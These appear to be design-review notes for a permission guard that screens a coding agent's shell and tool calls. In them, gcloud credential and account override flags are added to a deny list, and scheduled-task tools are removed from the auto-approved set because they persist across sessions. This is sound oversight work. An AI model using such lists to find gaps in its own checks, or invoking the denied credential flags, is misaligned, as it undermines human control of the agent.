- **B1 — stderr-merge detection:** Locked to structural `syntax.Walk` path; string fallback
  explicitly banned (Step 1.1).
- **B2 — ForbidFlags expansion:** Added `--account`, `--configuration`,
  `--credential-file-override`, `--billing-project`, `--access-token-file` to gcloud rule (Step 2.1).
- **I1 — doctor hint:** Upgraded to error-level when `CLAUDECODE=1` (Step 5.2).
- **I2 — Agent re-entry:** Verified via decision log (1179 entries with `agent_id`). Documented
  inline in the comment above `safeBuiltinTools` and asserted by
  `TestDecideGeneric_AgentReentryAssumption` (Task 3).
- **I3 — scheduled-tasks dropped:** `mcp__scheduled-tasks__` removed from
  `safeMCPServerPrefixes`; `create_scheduled_task` persists intent across sessions and falls
  through to LLM.
- **I4 — integration test:** New `decide_integration_test.go` with `//go:build integration` tag
  (Step 4.3).
- **N2 — gsutil tail args:** Corpus entries adjusted — `gsutil ls` (bare) matches; `gsutil ls
  gs://bucket` does not (positional fails `isSafeIdentifier`). Documented in Step 4.1.

## References
- Decision log examples: `~/.claude/logs/claude-guard/decisions.jsonl` (2026-04-19T08:13Z)
- Existing pattern: `claudeGuardReadonly` (uncommitted WIP in `defaults.go`)
- Related block rule: `NestedSubcommand` in `rules.go:436`
